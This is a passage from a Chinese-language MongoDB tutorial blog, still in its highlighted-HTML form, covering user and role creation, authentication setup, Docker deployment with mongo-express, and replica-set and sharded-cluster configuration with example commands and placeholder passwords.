class="string">"pwd"</span>:<span class="string">"password"</span>,<span class="string">"roles"</span>:[<span class="string">"root"</span>]&#125;)</span><br><span class="line"><span class="comment"># 创建admin超级管理员用户</span></span><br><span class="line"><span class="comment"># 指定用户的角色和数据库：(注意此时添加的用户都只用于admin数据库，而非你存储业务数据的数据库)</span></span><br><span class="line"><span class="comment"># (在cmd中敲多行代码时，直接敲回车换行，最后以分号首尾)</span></span><br><span class="line">db.createUser(  </span><br><span class="line">  &#123; user: <span class="string">"admin"</span>,  </span><br><span class="line">    customData：&#123;description:<span class="string">"superuser"</span>&#125;,</span><br><span class="line">    <span class="built_in">pwd</span>: <span class="string">"admin"</span>,  </span><br><span class="line">    roles: [ &#123; role: <span class="string">"userAdminAnyDatabase"</span>, db: <span class="string">"admin"</span> &#125; ]  </span><br><span class="line">  &#125;  </span><br><span class="line">)</span><br><span class="line"><span class="comment"># user字段，为新用户的名字；</span></span><br><span class="line"><span class="comment"># pwd字段，用户的密码；</span></span><br><span class="line"><span class="comment"># cusomData字段，为任意内容，例如可以为用户全名介绍；</span></span><br><span class="line"><span class="comment"># roles字段，指定用户的角色，可以用一个空数组给新用户设定空角色。在roles字段,可以指定内置角色和用户定义的角色。</span></span><br><span class="line"><span class="comment"># 超级用户的role有两种，userAdmin或者userAdminAnyDatabase(比前一种多加了对所有数据库的访问,仅仅是访问而已)。</span></span><br><span class="line"><span class="comment"># db是指定数据库的名字，admin是管理数据库。</span></span><br><span class="line"><span class="comment"># 不能用admin数据库中的用户登录其他数据库。注：只能查看当前数据库中的用户，哪怕当前数据库admin数据库，也只能查看admin数据库中创建的用户。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ===================下面创建普通账户=========================</span></span><br><span class="line"><span class="comment"># 创建一个业务数据库管理员用户，只负责某一个或几个数据库的増查改删</span></span><br><span class="line">db.createUser(&#123;</span><br><span class="line">    user:<span class="string">"user001"</span>,</span><br><span class="line">    <span class="built_in">pwd</span>:<span class="string">"123456"</span>,</span><br><span class="line">    customData:&#123;</span><br><span class="line">        name:<span class="string">'shawn'</span>,</span><br><span class="line">        email:<span class="string">'shawn@qq.com'</span>,</span><br><span class="line">        age:18,</span><br><span class="line">    &#125;,</span><br><span class="line">    roles:[</span><br><span class="line">        &#123;role:<span class="string">"readWrite"</span>,db:<span class="string">"db001"</span>&#125;,</span><br><span class="line">        &#123;role:<span class="string">"readWrite"</span>,db:<span class="string">"db002"</span>&#125;,</span><br><span class="line">        <span class="string">'read'</span>// 对其他数据库有只读权限，对db001、db002是读写权限</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================相关介绍=========================</span></span><br><span class="line"><span class="comment"># Built-In Roles（内置角色）：</span></span><br><span class="line"><span class="comment"># 1. 数据库用户角色：read、readWrite;</span></span><br><span class="line"><span class="comment"># 2. 数据库管理角色：dbAdmin、dbOwner、userAdmin；</span></span><br><span class="line"><span class="comment"># 3. 集群管理角色：clusterAdmin、clusterManager、clusterMonitor、hostManager；</span></span><br><span class="line"><span class="comment"># 4. 备份恢复角色：backup、restore；</span></span><br><span class="line"><span class="comment"># 5. 所有数据库角色：readAnyDatabase、readWriteAnyDatabase、userAdminAnyDatabase、dbAdminAnyDatabase</span></span><br><span class="line"><span class="comment"># 6. 超级用户角色：root，这里还有几个角色间接或直接提供了系统超级用户的访问（dbOwner 、userAdmin、userAdminAnyDatabase）</span></span><br><span class="line"><span class="comment"># 7. 内部角色：__system</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 具体角色的功能： </span></span><br><span class="line"><span class="comment"># 1. Read：允许用户读取指定数据库</span></span><br><span class="line"><span class="comment"># 2. readWrite：允许用户读写指定数据库</span></span><br><span class="line"><span class="comment"># 3. dbAdmin：允许用户在指定数据库中执行管理函数，如索引创建、删除，查看统计或访问system.profile</span></span><br><span class="line"><span class="comment"># 4. userAdmin：允许用户向system.users集合写入，可以找指定数据库里创建、删除和管理用户</span></span><br><span class="line"><span class="comment"># 5. clusterAdmin：只在admin数据库中可用，赋予用户所有分片和复制集相关函数的管理权限。</span></span><br><span class="line"><span class="comment"># 6. readAnyDatabase：只在admin数据库中可用，赋予用户所有数据库的读权限</span></span><br><span class="line"><span class="comment"># 7. readWriteAnyDatabase：只在admin数据库中可用，赋予用户所有数据库的读写权限</span></span><br><span class="line"><span class="comment"># 8. userAdminAnyDatabase：只在admin数据库中可用，赋予用户所有数据库的userAdmin权限</span></span><br><span class="line"><span class="comment"># 9. dbAdminAnyDatabase：只在admin数据库中可用，赋予用户所有数据库的dbAdmin权限。</span></span><br><span class="line"><span class="comment"># 10. root：只在admin数据库中可用。超级账号，超级权限</span></span><br></pre></td></tr></table></figure><h3 id="2-2-账户常用操作">2.2 账户常用操作</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看创建的用户</span></span><br><span class="line">show users</span><br><span class="line">db.system.users.find()</span><br><span class="line">db.runCommand(&#123;usersInfo:<span class="string">"userName"</span>&#125;)</span><br><span class="line"><span class="comment"># 修改密码</span></span><br><span class="line">use admin</span><br><span class="line">db.changeUserPassword(<span class="string">"username"</span>, <span class="string">"xxx"</span>)</span><br><span class="line"><span class="comment"># 修改密码和用户信息</span></span><br><span class="line">db.runCommand(</span><br><span class="line">    &#123;</span><br><span class="line">        updateUser:<span class="string">"username"</span>,</span><br><span class="line">        <span class="built_in">pwd</span>:<span class="string">"xxx"</span>,</span><br><span class="line">        customData:&#123;title:<span class="string">"xxx"</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 删除数据库用户</span></span><br><span class="line">use admin</span><br><span class="line">db.dropUser(<span class="string">'user001'</span>)</span><br><span class="line">db.dropAllUser() </span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建其他数据管理员</span></span><br><span class="line"><span class="comment"># 登录管理员用户</span></span><br><span class="line">use admin</span><br><span class="line">db.auth(<span class="string">'admin'</span>,<span class="string">'admin'</span>)</span><br><span class="line"><span class="comment"># 切换至db001数据库</span></span><br><span class="line">use db001</span><br><span class="line"><span class="comment"># 増查改删该数据库专有用户</span></span><br></pre></td></tr></table></figure><h3 id="2-3-权限启动认证">2.3 权限启动认证</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启用权限验证</span></span><br><span class="line">mongo --auth</span><br><span class="line"><span class="comment"># 或者修改mongo.conf，最后一行添加</span></span><br><span class="line">auth=<span class="literal">true</span></span><br><span class="line"><span class="comment"># 重新启动mongodb</span></span><br></pre></td></tr></table></figure><h2 id="3、Docker启动认证">3、Docker启动认证</h2><h3 id="3-1-创建管理员">3.1 创建管理员</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建一个文件夹用于存放数据，具体路径根据你自己想法来。这里这是举例。</span></span><br><span class="line">mkdir /mongo/data/</span><br><span class="line"><span class="comment"># 创建无校验的容器</span></span><br><span class="line">docker run --name linux-mongo -p 27017:27017 -v /mongo/data:/data/db -d mongo</span><br><span class="line"><span class="comment"># 进入容器</span></span><br><span class="line">docker <span class="built_in">exec</span> -it linux-mongo mongo admin</span><br><span class="line"><span class="comment"># 创建管理员</span></span><br><span class="line">db.createUser(&#123; user:<span class="string">'rootuser'</span>,<span class="built_in">pwd</span>:<span class="string">'rootpassword'</span>, roles: [ &#123; role: <span class="string">"userAdminAnyDatabase"</span>, db: <span class="string">"admin"</span> &#125; ] &#125;);</span><br><span class="line"><span class="comment"># 退出</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="comment"># 停止 linux-mongo 容器</span></span><br><span class="line">docker stop linux-mongo</span><br><span class="line"><span class="comment"># 删除。其实不删除也可以，没有其他影响，不删除记得下面步骤的命名不要重复。这里我建议你删除，因为容易混乱，如果需要重新配置再按上面步骤操作就可以。</span></span><br><span class="line">docker rm linux-mongo</span><br><span class="line"><span class="comment"># 至此创建管理员任务完成</span></span><br></pre></td></tr></table></figure><h3 id="3-2-创建-MongoDB-镜像-带验证">3.2 创建 MongoDB 镜像 - 带验证</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建容器 - 有校验</span></span><br><span class="line">docker run --name linux-mongo -p 27017:27017 -v /mongo/data:/data/db -d mongo --auth</span><br><span class="line"><span class="comment"># 启动容器之后，使用admin进入</span></span><br><span class="line">docker <span class="built_in">exec</span> -it linux-mongo mongo admin</span><br><span class="line"><span class="comment"># 权限认证</span></span><br><span class="line">db.auth(<span class="string">"rootuser"</span>,<span class="string">"rootpassword"</span>); <span class="comment"># 返回 1 证明成功， 返回 0 证明失败</span></span><br><span class="line"><span class="comment"># 创建可用用户。或者直接使用 rootuser ( 权限要要 root 才能在外部操作)</span></span><br><span class="line">db.createUser(&#123; user: <span class="string">'testadmin'</span>, <span class="built_in">pwd</span>: <span class="string">'testadmin123'</span>, roles: [ &#123; role: <span class="string">"root"</span>, db: <span class="string">"admin"</span> &#125; ] &#125;);</span><br><span class="line"><span class="comment"># 校验</span></span><br><span class="line">db.auth(<span class="string">"testadmin"</span>,<span class="string">"testadmin123"</span>); <span class="comment"># 返回 1 证明成功， 返回 0 证明失败</span></span><br><span class="line"><span class="comment"># 权限说明</span></span><br><span class="line"><span class="comment"># 1.数据库用户角色：read、readWrite;</span></span><br><span class="line"><span class="comment"># 2.数据库管理角色：dbAdmin、dbOwner、userAdmin；</span></span><br><span class="line"><span class="comment"># 3.集群管理角色：clusterAdmin、clusterManager、clusterMonitor、hostManager；</span></span><br><span class="line"><span class="comment"># 4.备份恢复角色：backup、restore</span></span><br><span class="line"><span class="comment"># 5.所有数据库角色：readAnyDatabase、readWriteAnyDatabase、userAdminAnyDatabase、dbAdminAnyDatabase</span></span><br><span class="line"><span class="comment"># 6.超级用户角色：root</span></span><br><span class="line"><span class="comment"># 退出</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="comment"># MongoDB 数据库操作</span></span><br><span class="line">show dbs; <span class="comment"># 查看现有数据库</span></span><br><span class="line">show users; <span class="comment"># 查看用户</span></span><br><span class="line">db.dropUser(<span class="string">"testadmin"</span>) <span class="comment"># 删除用户，外部想连接 testadmin 的话，此处不要删除</span></span><br><span class="line"><span class="comment"># 至此，有一个用户可以直接使用。</span></span><br></pre></td></tr></table></figure><h2 id="4、MongoDB可视化">4、MongoDB可视化</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">--name mongo \</span><br><span class="line">-v /home/docker/mongo/db:/data/db \</span><br><span class="line">-p 27017:27017 \</span><br><span class="line">-e MONGO_INITDB_ROOT_USERNAME=admin \</span><br><span class="line">-e MONGO_INITDB_ROOT_PASSWORD=123456 \</span><br><span class="line">--restart=always \</span><br><span class="line">mongo:5.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面是 mongo-express 可视化</span></span><br><span class="line">docker run -d \</span><br><span class="line">--name mongo-express \</span><br><span class="line">-p 8081:8081 \</span><br><span class="line">--link mongo \</span><br><span class="line">-e ME_CONFIG_MONGODB_SERVER=<span class="string">'172.21.9.203'</span> \</span><br><span class="line">-e ME_CONFIG_MONGODB_ADMINUSERNAME=<span class="string">'admin'</span> \</span><br><span class="line">-e ME_CONFIG_MONGODB_ADMINPASSWORD=<span class="string">'123456'</span> \</span><br><span class="line">-e ME_CONFIG_BASICAUTH_USERNAME=<span class="string">'admin'</span> \</span><br><span class="line">-e ME_CONFIG_BASICAUTH_PASSWORD=<span class="string">'admin123'</span> \</span><br><span class="line">--restart=always \</span><br><span class="line">mongo-express:0.54</span><br></pre></td></tr></table></figure><h1>五、副本与集群</h1><h2 id="1、副本集">1、副本集</h2><blockquote><p><a href="https://www.mongodb.com/docs/manual/replication/" target="_blank" rel="noopener" title="https://www.mongodb.com/docs/manual/replication/">https://www.mongodb.com/docs/manual/replication/</a></p></blockquote><h3 id="1-1-概述">1.1 概述</h3><p>MongoDB 副本集（Replica Set）是有自动故障恢复功能的主从集群，有一个Primary节点和一个或多个Secondary节点组成。副本集没有固定的主节点，当主节点发生故障时整个集群会选举一个主节点为系统提供服务以保证系统的高可用。注意：这种方式并不能解决主节点的单点访问压力问题。</p><p>**注意：**当MongoDB副本集架构只剩一个节点时，整个节点是不可用的。单主不可写</p><p><img src="http://qnypic.shawncoding.top/blog/202312131426150.png" alt></p><h3 id="1-2-自动故障转移">1.2 自动故障转移</h3><p>当主节点未与集合的其他成员通信超过配置的选举超时时间（默认为 10 秒）时，合格的辅助节点将调用选举以将自己提名为新的主节点。集群尝试完成新主节点的选举并恢复正常操作。</p><p><img src="http://qnypic.shawncoding.top/blog/202312131426151.png" alt></p><h3 id="1-3-副本集搭建">1.3 副本集搭建</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这里我是用了一台机器，可以分作不同机器，注意ip即可</span></span><br><span class="line"><span class="comment"># 创建数据目录</span></span><br><span class="line">mkdir -p rep1/data1</span><br><span class="line">mkdir -p rep1/data2</span><br><span class="line">mkdir -p rep1/data3</span><br><span class="line"><span class="comment"># 搭建副本集</span></span><br><span class="line">./mongod --port 27017 --dbpath ../rep1/data1 --bind_ip 0.0.0.0 --replSet myreplace/[1.14.17.152:27018,1.14.17.152:27019]</span><br><span class="line">./mongod --port 27018 --dbpath ../rep1/data2 --bind_ip 0.0.0.0 --replSet myreplace/[1.14.17.152:27017,1.14.17.152:27019]</span><br><span class="line">./mongod --port 27019 --dbpath ../rep1/data3 --bind_ip 0.0.0.0 --replSet myreplace/[1.14.17.152:27018,1.14.17.152:27017]</span><br><span class="line"><span class="comment"># ./ mongo --port 27018</span></span><br><span class="line"><span class="comment"># 配置副本集，连接任意节点</span></span><br><span class="line">use admin</span><br><span class="line"><span class="comment"># 初始化副本集</span></span><br><span class="line">var config = &#123; </span><br><span class="line">         _id:<span class="string">"myreplace"</span>, </span><br><span class="line">         members:[</span><br><span class="line">         &#123;_id:0,host:<span class="string">"121.5.167.13:27017"</span>&#125;,</span><br><span class="line">         &#123;_id:1,host:<span class="string">"121.5.167.13:27018"</span>&#125;,</span><br><span class="line">         &#123;_id:2,host:<span class="string">"121.5.167.13:27019"</span>&#125;]</span><br><span class="line"> &#125;</span><br><span class="line">rs.initiate(config);//初始化配置</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入从节点，让其可以读，每个从节点都要设置</span></span><br><span class="line"><span class="comment"># 设置客户端临时可以访问，然后navicat就可以集群连接了</span></span><br><span class="line">rs.slaveOk();  //旧的</span><br><span class="line">rs.secondaryOk();  //新的</span><br><span class="line"></span><br><span class="line"><span class="comment"># springboot ：spring.data.mongodb.uri=mongodb://1.14.17.152:27017,1.14.17.152:27018,1.14.17.152:27019/chihiro</span></span><br></pre></td></tr></table></figure><p>还有一种方式是配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 检查端口运行情况 如果正在运行 关闭服务</span></span><br><span class="line">netstat -lnp | grep 27017</span><br><span class="line"></span><br><span class="line"><span class="comment">## 切换到 /opt/home目录下</span></span><br><span class="line"><span class="built_in">cd</span> /opt/home/</span><br><span class="line"> </span><br><span class="line"><span class="comment">## 将mongodb5.0.5复制三份</span></span><br><span class="line">cp -r mongodb5.0.5/ mongodb1</span><br><span class="line">cp -r mongodb5.0.5/ mongodb2</span><br><span class="line">cp -r mongodb5.0.5/ mongodb3</span><br><span class="line"></span><br><span class="line"><span class="comment">## 创建数据目录</span></span><br><span class="line">mkdir -p /data/mongodb/data1</span><br><span class="line">mkdir -p /data/mongodb/data2</span><br><span class="line">mkdir -p /data/mongodb/data3</span><br><span class="line"></span><br><span class="line"><span class="comment">## 进入mongodb1的bin目录</span></span><br><span class="line"><span class="built_in">cd</span> mongodb1/bin/</span><br><span class="line"></span><br><span class="line"><span class="comment">## 修改mongodb.conf配置文件</span></span><br><span class="line">vim mongodb.conf </span><br><span class="line"></span><br><span class="line"><span class="comment">## 修改内容如下 修改datapath、logpath目录和port端口号</span></span><br><span class="line"><span class="comment">#数据文件存放目录</span></span><br><span class="line">dbpath = /data/mongodb/data1</span><br><span class="line"><span class="comment">#日志文件存放地址</span></span><br><span class="line">logpath =/data/mongodb/log1.log</span><br><span class="line"><span class="comment">#端口</span></span><br><span class="line">port = 27018</span><br><span class="line"><span class="comment">#以守护程序的方式启用，即在后台运行</span></span><br><span class="line">fork = <span class="literal">true</span></span><br><span class="line"><span class="comment">#需要认证。如果放开注释，就必须创建MongoDB的账号，使用账号与密码才可&gt;远程访问，第一次安装建议注释</span></span><br><span class="line"><span class="comment">#auth=true </span></span><br><span class="line"><span class="comment">#允许远程访问，或者直接注释，127.0.0.1是只允许本地访问</span></span><br><span class="line">bind_ip=0.0.0.0</span><br><span class="line">replSet=myreplace/[192.168.200.128:27019,192.168.200.128:27020]</span><br><span class="line"></span><br><span class="line"><span class="comment">## 其余两个同上 端口分别为 27018 27019 27020</span></span><br><span class="line"><span class="comment"># 分别连接三台MongoDB</span></span><br><span class="line">./mongo --port 27018</span><br><span class="line">./mongo --port 27019</span><br><span class="line">./mongo --port 27020</span><br><span class="line"><span class="comment"># 配置副本集，连接任意节点</span></span><br><span class="line">var config = &#123; </span><br><span class="line">    _id:<span class="string">"myreplace"</span>, </span><br><span class="line">    members:[</span><br><span class="line">    &#123;_id:0,host:<span class="string">"192.168.200.128:27018"</span>&#125;,</span><br><span class="line">    &#123;_id:1,host:<span class="string">"192.168.200.128:27019"</span>&#125;,</span><br><span class="line">    &#123;_id:2,host:<span class="string">"192.168.200.128:27020"</span>&#125;]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">## 初始化配置 </span></span><br><span class="line">rs.initiate(config);</span><br><span class="line"></span><br><span class="line"><span class="comment">## 在主节点添加一条数据</span></span><br><span class="line">use <span class="built_in">test</span>;</span><br><span class="line">db.test.insert(&#123;_id:1, name:<span class="string">'java'</span>&#125;);</span><br><span class="line">db.test.find();</span><br><span class="line"></span><br><span class="line"><span class="comment">## 设置客户端临时可以访问 分别在从节点执行查询命令db.test.find();</span></span><br><span class="line"><span class="comment"># 方式一</span></span><br><span class="line">rs.slaveOk();</span><br><span class="line"><span class="comment"># 方式二</span></span><br><span class="line">rs.secondaryOk();</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询</span></span><br><span class="line">db.test.find();</span><br><span class="line"></span><br><span class="line"><span class="comment">## 手动摸拟异常 关闭主节点 查看从节点是否从新选举</span></span><br><span class="line"><span class="comment"># 结果 从节点会从新选举主节点 主节点再次启动后会自动变更为从节点</span></span><br></pre></td></tr></table></figure><h2 id="2、分片集群-sharing-cluster">2、分片集群(sharing cluster)</h2><blockquote><p><a href="https://www.mongodb.com/docs/manual/sharding/" target="_blank" rel="noopener" title="https://www.mongodb.com/docs/manual/sharding/">https://www.mongodb.com/docs/manual/sharding/</a></p></blockquote><h3 id="2-1-概述">2.1 概述</h3><p><strong>分片(sharding)是指将数据拆分，将其分散存在不同机器的过程</strong>，有时也用分区(partitioning)来表示这个概念,将数据分散在不同的机器上，不需要功能强大的大型计算机就能存储更多的数据，处理更大的负载。</p><p>分片目的是通过分片能够增加更多机器来应对不断的增加负载和数据，还不影响应用运行。MongoDB支持自动分片,可以摆脱手动分片的管理困扰，集群自动切分数据做负载均衡。 </p><p>MongoDB分片的基本思想就是将集合拆分成多个块，这些快分散在若干个片里，每个片只负责总数据的一部分，应用程序不必知道哪些片对应哪些数据，甚至不需要知道数据拆分了，所以在分片之前会运行一个路由进程，mongos进程，这个路由器知道所有的数据存放位置，应用只需要直接与mongos交互即可。mongos自动将请求转到相应的片上获取数据，从应用角度看分不分片没有什么区别。</p><h3 id="2-2-架构">2.2 架构</h3><p><img src="http://qnypic.shawncoding.top/blog/202312131426152.png" alt></p><ul><li>Shard: 用于存储实际的数据块，实际生产环境中一个shard server角色可由几台机器组个一个replica set承担，防止主机单点故障</li><li>Config Server:mongod实例，存储了整个 ClusterMetadata</li><li>Query Routers: 前端路由，客户端由此接入，且让整个集群看上去像单一数据库，前端应用可以透明使用</li><li>Shard Key: 片键，设置分片时需要在集合中选一个键,用该键的值作为拆分数据的依据,这个片键称之为(shard key)，片键的选取很重要,片键的选取决定了数据散列是否均匀</li></ul><h3 id="2-3-分片集群搭建">2.3 分片集群搭建</h3><p>下面是原生安装集群，docker安装可以参考：<a href="https://blog.csdn.net/qq_38008295/article/details/110952401" target="_blank" rel="noopener" title="Docker部署MongoDB分片+副本集集群（实战）">Docker部署MongoDB分片+副本集集群（实战）</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.集群规划</span></span><br><span class="line">- Shard Server 1：27017</span><br><span class="line">- Shard Repl   1：27018</span><br><span class="line"></span><br><span class="line">- Shard Server 2：27019</span><br><span class="line">- Shard Repl   2：27020</span><br><span class="line"></span><br><span class="line">- Shard Server 3：27021</span><br><span class="line">- Shard Repl   3：27022</span><br><span class="line"></span><br><span class="line">- Config Server ：27023</span><br><span class="line">- Config Server ：27024</span><br><span class="line">- Config Server ：27025</span><br><span class="line"></span><br><span class="line">- Route Process ：27026</span><br><span class="line"></span><br><span class="line"><span class="comment">#2.进入安装的bin目录创建数据目录</span></span><br><span class="line"><span class="comment">## s0</span></span><br><span class="line">mkdir -p /data/mongodb/shard/s0</span><br><span class="line">mkdir -p /data/mongodb/shard/s0-repl</span><br><span class="line"></span><br><span class="line"><span class="comment">## s1</span></span><br><span class="line">mkdir -p /data/mongodb/shard/s1</span><br><span class="line">mkdir -p /data/mongodb/shard/s1-repl</span><br><span class="line"></span><br><span class="line"><span class="comment">## s2</span></span><br><span class="line">mkdir -p /data/mongodb/shard/s2</span><br><span class="line">mkdir -p /data/mongodb/shard/s2-repl</span><br><span class="line"></span><br><span class="line"><span class="comment">## config</span></span><br><span class="line">mkdir -p /data/mongodb/shard/config1</span><br><span class="line">mkdir -p /data/mongodb/shard/config2</span><br><span class="line">mkdir -p /data/mongodb/shard/config3</span><br><span class="line"></span><br><span class="line">mkdir -p /data/mongodb/shard/config</span><br></pre></td></tr></table></figure><p>启动6个 shard服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 启动 s0、r0</span></span><br><span class="line">./mongod --port 27017 --dbpath /data/mongodb/shard/s0 --bind_ip 0.0.0.0 --shardsvr --replSet r0/123.57.80.91:27018 --fork --logpath /data/mongodb/shard/s0/s0.log</span><br><span class="line"></span><br><span class="line">./mongod --port 27018 --dbpath /data/mongodb/shard/s0-repl --bind_ip 0.0.0.0 --shardsvr --replSet r0/123.57.80.91:27017 --fork --logpath /data/mongodb/shard/s0-repl/s0-repl.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录任意节点</span></span><br><span class="line">./mongo --port 27017</span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择admin库</span></span><br><span class="line">use admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在admin中执行</span></span><br><span class="line">config = &#123; </span><br><span class="line">  _id:<span class="string">"r0"</span>, members:[</span><br><span class="line">      &#123;_id:0,host:<span 